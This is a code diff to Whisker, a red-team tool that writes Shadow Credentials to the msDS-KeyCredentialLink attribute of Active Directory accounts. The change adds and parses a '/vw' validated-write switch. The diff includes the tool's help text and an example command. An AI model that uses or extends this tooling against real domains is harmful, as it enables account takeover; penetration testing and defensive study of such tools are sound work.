@@ -201,6 +201,10 @@ msDS-KeyCredentialLink attribute, effectively adding Shadow Credentials to the t
     [/path:<PATH>]            [add mode] Optional in add mode. Set the path to store the generated self-signed certificate 
                               for authentication. If not provided, the certificate will be printed as a Base64 blob.
 
+    [/vw]                     [add mode] Optional in add mode. Performs the add operation so that it comples with the
+                              restrictions of a validated write. 
+                              Warning: This clears the msDS-KeyCredentialLink attribute and could cause disruptions.
+
 ==[Examples]=========
 
   list    => Whisker.exe list /target:computername$ /domain:constoso.local /dc:dc1.contoso.local
@@ -295,7 +299,7 @@ This tool is based on code from DSInternals by Michael Grafnetter (@MGrafnetter)
                 string dc;
                 string path;
                 string password;
-                bool vw; // to enable validated write mode
+                bool vw = false; // to enable validated write mode
                 Guid deviceID = Guid.Empty;
 
                 if (!arguments.ContainsKey("target") || String.IsNullOrEmpty(arguments["target"]))
@@ -375,14 +379,15 @@ This tool is based on code from DSInternals by Michael Grafnetter (@MGrafnetter)
                     password = arguments["password"];
                 }
 
-                if (!arguments.ContainsKey("vw") || String.IsNullOrEmpty(arguments["vw"]))
+                if (arguments.TryGetValue("vw", out var vwValue))
                 {
-                    vw = "";
+                    if (!String.IsNullOrEmpty(vwValue))
+                    {
+                        Console.WriteLine("[X] /vw is a switch and does not take a value.");
+                        return;
+                    }
+                    vw = true;
                 }
-                else
-                {
-                    vw = arguments["vw"];
-                }                
 
                 switch (command)
                 {
@@ -436,12 +441,12 @@ This tool is based on code from DSInternals by Michael Grafnetter (@MGrafnetter)
             Console.WriteLine("[*] Certificate generated");
             Console.WriteLine("[*] Generating KeyCredential");
             Guid guid = Guid.NewGuid();
-            keyCredential = new KeyCredential(cert, guid, targetObject.Properties["distinguishedName"][0].ToString(), DateTime.Now);
+            keyCredential = new KeyCredential(cert, guid, targetObject.Properties["distinguishedName"][0].ToString(), DateTime.Now, vw);
             Console.WriteLine("[*] KeyCredential generated with DeviceID {0}", guid.ToString());
+            Console.WriteLine("[*] KeyCredential Info: {0}", keyCredential.ToString());
 
             try
             {
-                // TODO: if vw switch is specified clear the msDS-KeyCredentialLink before adding. Also ensure vw is actually a switch 
                 if (vw)
                 {
                     Console.WriteLine("[*] ValidatedWrite the msDS-KeyCredentialLink attribute of the target object");
